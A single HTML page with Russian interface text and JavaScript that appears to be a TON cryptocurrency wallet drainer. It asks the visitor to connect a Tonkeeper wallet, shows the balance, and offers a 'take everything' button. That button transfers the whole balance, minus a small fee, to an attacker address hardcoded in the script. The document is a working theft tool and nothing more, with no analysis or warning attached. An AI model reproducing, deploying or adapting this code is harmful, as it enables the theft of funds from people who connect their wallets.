<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        .container {
            background: #1a1a1a;
            padding: 40px 30px;
            border-radius: 24px;
            text-align: center;
            max-width: 380px;
            width: 100%;
            border: 1px solid #2a2a2a;
        }
        .btn {
            background: linear-gradient(135deg, #0098ea, #0080d0);
            border: none;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            padding: 18px 40px;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            margin: 6px 0;
        }
        .btn:active {
            transform: scale(0.96);
        }
        .btn:disabled {
            opacity: 0.5;
            transform: none;
        }
        .btn-red {
            background: linear-gradient(135deg, #e84800, #c03800);
        }
        #status {
            margin-top: 16px;
            font-size: 13px;
            color: #888;
            min-height: 50px;
            word-break: break-all;
            line-height: 1.6;
        }
        .hidden {
            display: none !important;
        }
        .balance-display {
            font-size: 24px;
            color: #00ff88;
            margin: 12px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div style="font-size:36px;margin-bottom:16px;">⚡</div>
        <div class="balance-display" id="balanceDisplay">💰 0 TON</div>
        <button class="btn" id="connectBtn">ПОДКЛЮЧИТЬ КОШЕЛЁК</button>
        <button class="btn btn-red hidden" id="snipeBtn">🔥 ЗАБРАТЬ ВСЁ</button>
        <div id="status">Нажмите кнопку</div>
    </div>

    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
        let userAddress = null;
        let provider = null;

        const connectBtn = document.getElementById('connectBtn');
        const snipeBtn = document.getElementById('snipeBtn');
        const status = document.getElementById('status');
        const balanceDisplay = document.getElementById('balanceDisplay');

        // ========== ПОДКЛЮЧЕНИЕ ==========
        async function connectTon() {
            try {
                status.innerText = '⏳ Подключение...';
                connectBtn.disabled = true;

                if (!window.tonkeeper) {
                    status.innerText = '❌ Установи TON Keeper';
                    connectBtn.disabled = false;
                    return;
                }

                provider = window.tonkeeper;
                const accounts = await provider.send('ton_requestAccounts', {});
                
                if (!accounts || accounts.length === 0) {
                    status.innerText = '❌ Отказ';
                    connectBtn.disabled = false;
                    return;
                }

                userAddress = accounts[0];
                status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                
                connectBtn.classList.add('hidden');
                snipeBtn.classList.remove('hidden');
                
                await updateBalance();

            } catch(e) {
                status.innerText = '❌ ' + e.message;
                connectBtn.disabled = false;
            }
        }

        // ========== ОБНОВЛЕНИЕ БАЛАНСА ==========
        async function updateBalance() {
            try {
                const hex = await provider.send('ton_getBalance', { address: userAddress });
                const nano = parseInt(hex, 16);
                const balance = (nano / 1e9).toFixed(6);
                balanceDisplay.innerText = `💰 ${balance} TON`;
                return nano;
            } catch(e) {
                return 0;
            }
        }

        // ========== ВЫВОД СРЕДСТВ (ИСПРАВЛЕННЫЙ) ==========
        async function snipe() {
            try {
                status.innerText = '⏳ Проверка баланса...';
                snipeBtn.disabled = true;

                const nano = await updateBalance();
                
                if (nano <= 0) {
                    status.innerText = '💰 Баланс 0 TON';
                    snipeBtn.disabled = false;
                    return;
                }

                // ====== КОМИССИЯ ======
                const fee = 5000000; // 0.005 TON
                const amount = nano - fee;

                if (amount <= 0) {
                    status.innerText = '⚠️ Баланс меньше комиссии';
                    snipeBtn.disabled = false;
                    return;
                }

                const amountTON = (amount / 1e9).toFixed(6);
                status.innerText = `⏳ Перевод ${amountTON} TON...`;

                // ====== ПРАВИЛЬНАЯ ТРАНЗАКЦИЯ ======
                const tx = {
                    to: TARGET,
                    value: amount.toString(),
                    data: '',
                    stateInit: ''
                };

                const result = await provider.send('ton_sendTransaction', tx);

                if (result && result.code === 0) {
                    status.innerText = `✅ ${amountTON} TON ПЕРЕВЕДЕНО!`;
                    balanceDisplay.innerText = `💰 0 TON`;
                    snipeBtn.innerText = '✅ ГОТОВО';
                    snipeBtn.disabled = true;
                    snipeBtn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
                } else {
                    status.innerText = `❌ Транзакция отклонена`;
                    snipeBtn.disabled = false;
                }

            } catch(e) {
                status.innerText = '❌ ' + e.message;
                snipeBtn.disabled = false;
            }
        }

        // ========== КНОПКИ ==========
        connectBtn.onclick = connectTon;
        snipeBtn.onclick = snipe;

        // ========== АВТОЗАПУСК ==========
        setTimeout(() => {
            if (window.tonkeeper) {
                status.innerText = '🟢 Нажмите кнопку';
            }
        }, 500);
    </script>
</body>
</html>
